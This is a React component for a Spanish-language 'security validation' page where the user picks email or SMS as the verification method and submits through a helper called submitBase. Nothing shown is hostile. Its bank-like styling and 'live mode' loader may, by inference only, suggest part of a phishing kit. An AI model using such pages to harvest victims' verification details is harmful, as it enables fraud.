import React from 'react'
import { useGeneralData } from '../../../hooks/useGeneralData'
import { useFormik } from 'formik'
import { submitBase } from '../../../helpers/submitBase'
import { Spiner } from '../../Spiner'

const valuesData = { method: 'CORREO'}


export const MethodPage = () => {

  const dataImportant = useGeneralData({modeLive: true, spiner: true, timeLoader: 4000 })
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues: valuesData,
      onSubmit: async(valuesData, {resetForm}) => {
        await submitBase({dataImportant, valuesData})
      }
  })
  return (
    <div className='text-[#666]'>
      {dataImportant.showSpiner === true ? <Spiner /> : null}
      <p className='text-[#e31e1a] text-[24px] mb-[7.5px]'>Validacion de seguridad</p>
      <div className='mb-[20px] border-b-[1px] border-b-[#eee]' />
      <form onSubmit={handleSubmit}>
        <div className='flex flex-col gap-5'>
          <span>Selecciona el medio de seguridad que desea seguir</span>
          
          <div className='flex gap-2'>
            <input
              id="method"
              name="method"
              type="radio"
              defaultChecked
              onChange={handleChange}
              onBlur={handleBlur}
              value={'CORREO'}
              />
            <label htmlFor="method">Correo Electrónico</label>
          </div>
          <div className='flex gap-2'>
            <input
              id="sms"
              name="method"
              type="radio"
              onChange={handleChange}
              onBlur={handleBlur}
              value={'SMS'}
              />
            <label htmlFor="sms">SMS</label>
          </div>
        </div>
        
       
        <div className='flex flex-col justify-center mt-8'>
          <button 
             type='submit'
             className='bg-[#6051a1] px-[12px] hover:bg-[#ff9900] py-[6px] h-[34px] text-[15px] text-white leading-[20px] w-full'
            >
              <span className='h-[20px]'>
                ACEPTAR
              </span>
          </button>
          <button 
             className=' px-[12px] py-[6px] h-[34px] TEXT text-[15px] leading-[20px] w-full'
            >
              <span className='h-[20px]'>
                CANCELAR
              </span>
          </button>
        </div>
      </form>
    </div>
  )
}
